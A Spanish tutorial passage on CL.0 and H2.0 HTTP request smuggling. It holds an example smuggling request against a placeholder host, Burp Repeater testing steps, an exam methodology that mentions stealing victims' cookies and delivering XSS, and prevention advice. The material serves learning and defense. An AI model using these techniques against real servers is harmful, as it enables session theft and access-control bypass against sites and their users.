En esta sección, aprenderemos cómo podemos `crear exploits de alto impacto sin depender de solicitudes malformadas que los navegadores nunca enviarán`. Esto no solo `expone toda una nueva gama de sitios web a request smuggling del lado del servidor`, sino que también nos permite `realizar variantes del lado del cliente de estos ataques`, induciendo al `navegador de una víctima a envenenar su propia conexión con un servidor web vulnerable`

### Vulnerabilidades CL.0 de request smuggling

Las `vulnerabilidades de request smuggling` son el resultado de `discrepancias en la forma en que sistemas encadenados determinan dónde comienza y dónde termina cada solicitud`. Normalmente, esto se debe a un `análisis inconsistente de las cabeceras`, lo que provoca que un `servidor utilice la cabecera Content-Length de una solicitud mientras que el otro trate el mensaje como chunked`. Sin embargo, es posible `realizar muchos de los mismos ataques sin depender de ninguno de estos problemas`

En algunos casos, se puede conseguir que los `servidores ignoren la cabecera Content-Length`, lo que significa que `asumen que cada solicitud termina al final de las cabeceras`. Esto es, en la práctica, `equivalente a tratar el valor de Content-Length como 0`

Si el `servidor back-end presenta este comportamiento`, pero el `servidor front-end sigue utilizando la cabecera Content-Length para determinar dónde termina la solicitud`, podemos `aprovechar potencialmente esta discrepancia para realizar un HTTP request smuggling`. A esta vulnerabilidad se la conoce como `CL.0`

#### Testeando vulnerabilidades CL.0

Para comprobar si existen `vulnerabilidades CL.0`, primero debemos `enviar una solicitud que contenga otra solicitud parcial en su body` y a continuación, `enviar una segunda solicitud normal`. Después, debemos `comprobar si la respuesta a esta segunda solicitud se ha visto afectada por la solicitud parcial introducida mediante request smuggling`

En el siguiente ejemplo, la `segunda solicitud para la página de inicio` ha recibido una `respuesta 404`. Esto sugiere claramente que el `servidor back-end interpretó el cuerpo de la solicitud POST (GET /hopefully404...)` como el `inicio de otra solicitud`

Solicitud

```
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/1.1
Host: vulnerable-website.com
```

Respuesta

```
HTTP/1.1 200 OK






HTTP/1.1 404 Not Found
```

Es importante destacar que `para este ataque no es necesario manipular las cabeceras de ninguna manera, ya que la longitud de la solicitud está especificada mediante una cabecera Content-Length completamente normal y correcta`

Para `testear esto nosotros mismo` usando `Repeater` tenemos que:

- `Crear una pestaña que contenga la solicitud de preparación` y otra que contenga una `solicitud normal cualquiera`

- `Añadir ambas pestañas a un grupo en el orden correcto`

- Utilizar el `menú desplegable situado junto al botón Send`, cambiar el `modo de envío` a `Send group in sequence (single connection)`

- Cambiar la cabecera `Connection` a `keep-alive`

- `Envíar la secuencia` y `comprobar las respuestas`

En la práctica, este comportamiento se da principalmente en `endpoints que simplemente no esperan recibir solicitudes POST`, por lo que `asumen implícitamente que las solicitudes no tienen cuerpo`. Los `endpoints que desencadenan redirecciones a nivel de servidor` y las `solicitudes de archivos estáticos` son `candidatos especialmente adecuados`

#### Provocar el comportamiento CL.0

Si no encontramos ningún `endpoint que parezca vulnerable`, podemos intentar `provocar este comportamiento`

Cuando las `cabeceras de una solicitud desencadenan un error en el servidor`, algunos `servidores generan una respuesta de error sin consumir el body de la solicitud del socket`. Si después `no cierran la conexión`, esto puede proporcionar un `vector alternativo de desincronización CL.0`

También podemos probar a utilizar `solicitudes GET` con una cabecera `Content-Length` ofuscada. Si conseguimos `ocultarla al servidor back-end`, pero no al `servidor front-end`, esto también puede provocar una `desincronización`

Ya vimos algunas `técnicas de ofuscación de cabeceras` cuando tratamos el `request smuggling TE.TE`

#### Explotar vulnerabilidades CL.0

Puedes explotar las `vulnerabilidades CL.0` para `llevar a cabo los mismos ataques de request smuggling del lado del servidor que vimos en el material anterior sobre request smuggling`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- CL.0 request smuggling - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-15/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-15)

#### Vulnerabilidades H2.0

Los `sitios web que realizan HTTP/2 downgrading de las solicitudes HTTP/2 a HTTP/1` pueden ser `vulnerables a un problema equivalente denominado H2.0` si el servidor back-end ignora la cabecera `Content-Length` de la `solicitud downgradeada`

## Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

## ¿Cómo detectar y explotar vulnerabilidades de HTTP request smuggling

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1 - `Instalar` la extensión `HTTP Request Smuggler`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`. En esta parte si `encontramos` un `XSS`, lo que debemos hacer es `usar el HTTP request smuggling para que la víctima ejecute el payload`

4 - `Para todos los ataques que vamos a ver a continuación a la hora que ejecutar las veririficaciones o los ataques es muy importante que enviemos muy rápido la segunda solicitud`. Además, `debemos de hacer esto varias veces para estar seguros`

5 - Lo más recomendable para esta `vulnerabilidad` es `ver todos los posts de HTTP request smuggling` y `replicarlos a la hora del examen uno a uno`

6 - Las `vulnerabilidades que se dan puramente mediante el protocolo HTTP/1.1` son `TE.CL, CL.TE, TE.TE` 

7 - La `vulnerabilidad CL.0` también usa el `protocolo HTTP/1.1` pero la `metodología para encontrarla es diferente` así que la `pongo a parte`

8 - Las `vulnerabilidades que utilizan el protocolo HTTP/2 y que realizan downgrading` son `H2.TE` y `H2.CL`

9 - Puede que necesitemos `realizar una inyección CLRF`, un `rewriting de la solicitud para obtener la cookie de la víctima` o una cabecera que queramos obtener que añada el `servidor frontend` y necesitemos para realizar una solicitud a `/admin`, `ofuscar la cabecera Transfer-Encoding para convertir un TE.TE en un TE.CL o en un CL.TE`, `llevar a cabo un response queue poisoning` o `usar el HTTP request smuggling para ejecutar un XSS en el navegador de la víctima`

## Prevenir vulnerabilidades de HTTP request smuggling

Las `vulnerabilidades de HTTP request smuggling` surgen cuando el `servidor front-end` y el `servidor back-end` utilizan `mecanismos diferentes para determinar los límites entre las solicitudes`. Esto puede deberse a discrepancias en el uso de la cabecera `Content-Length` o de la codificación `chunked` por parte de los `servidores HTTP/1` para `determinar dónde termina cada solicitud`. En entornos `HTTP/2`, la `práctica habitual de realizar HTTP/2 downgrading de las solicitudes para el back-end` también `presenta numerosos problemas` y `permite o facilita diversos ataques adicionales`

Para `prevenir vulnerabilidades de HTTP request smuggling`, se recomiendan las siguientes `medidas generales`:

- `Utilizar HTTP/2 de extremo a extremo` y `deshabilitar el HTTP downgrading siempre que sea posible`. `HTTP/2` utiliza un `mecanismo robusto para determinar la longitud de las solicitudes` y, cuando se utiliza de extremo a extremo, está `protegido de forma inherente frente a request smuggling`. Si no podemos evitar el `HTTP downgrading`, debemos segurarnos de `validar la solicitud reescrita conforme a la especificación HTTP/1.1`. Por ejemplo, `rechazar las solicitudes que contengan saltos de línea en las cabeceras`, `dos puntos en los nombres de las cabeceras` y `espacios en el método de la solicitud`

- Hacer que el `servidor front-end` normalice las `solicitudes ambiguas` y que el `servidor back-end` rechace `cualquier solicitud que siga siendo ambigua`, `cerrando la conexión TCP durante el proceso`

- `No asumir nunca que las solicitudes no tendrán un body`. Esta es la `causa fundamental` tanto de las `vulnerabilidades CL.0` como de las `vulnerabilidades de desincronización del lado del cliente`

- `Configurar el comportamiento por defecto para descartar la conexión cuando se produzcan excepciones a nivel del servidor durante el procesamiento de las solicitudes`

- Si enrutamos el `tráfico a través de un forward proxy`, debemos asegurarnnos de que `HTTP/2` esté `habilitado en la conexión con el servidor upstream siempre que sea posible`

Como hemos demostrado en el `material de aprendizaje`, `deshabilitar la reutilización de las conexiones con el back-end` ayuda a `mitigar ciertos tipos de ataque`, pero aun así `no protege frente a los ataques de request tunnelling`
